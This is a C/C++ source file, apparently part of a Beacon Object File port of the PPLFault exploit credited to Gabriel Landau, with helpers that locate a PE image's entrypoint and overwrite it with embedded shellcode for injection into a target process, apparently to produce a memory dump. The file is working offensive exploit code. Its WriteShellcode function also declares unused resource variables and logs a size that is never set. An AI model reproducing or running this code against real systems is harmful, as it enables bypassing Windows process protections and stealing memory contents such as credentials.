// PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau

#define _CRT_SECURE_NO_WARNINGS
#include "PayloadUtils.h"
#include "bofdefs.h"
#include <DbgHelp.h>
#include <string>
#include "Logging.h"

uint8_t* shellcode;
DWORD shellcodelen;

extern bool InitShellcodeParams(
    PVOID pParams,
    DWORD dwTargetProcessId,
    PCWCHAR pDumpPath
);

// Finds the address within buf of the image entrypoint 
PVOID FindEntrypointVA(const std::string& buf)
{
    PVOID pBase = (PVOID)buf.data();
    PIMAGE_NT_HEADERS pNtHeaders = DBGHELP$ImageNtHeader(pBase);

    if (NULL == pNtHeaders)
    {
        Log(Error, "FindOffsetOfEntrypoint: ImageNtHeader failed with GLE %u.  Is this a PE file?", GetLastError());
        return NULL;
    }

    if (IMAGE_FILE_MACHINE_AMD64 != pNtHeaders->FileHeader.Machine)
    {
        Log(Error, "FindOffsetOfEntrypoint: Only x64 is supported");
        return NULL;
    }

    // Map RVA -> VA
    return DBGHELP$ImageRvaToVa(pNtHeaders, pBase, pNtHeaders->OptionalHeader.AddressOfEntryPoint, NULL);
}

// Pulls the shellcode out of our resource section and writes to the given pointer
bool WriteShellcode(PVOID pBuf, DWORD& bytesWritten)
{
    HRSRC hr = NULL;
    HGLOBAL hg = NULL;
    LPVOID pResource = NULL;
    DWORD rSize = 0;

    

    memcpy(pBuf, shellcode, shellcodelen);
    bytesWritten = shellcodelen;

    internal_printf("GetShellcode: %u bytes of shellcode written over DLL entrypoint", rSize);


    return true;
}
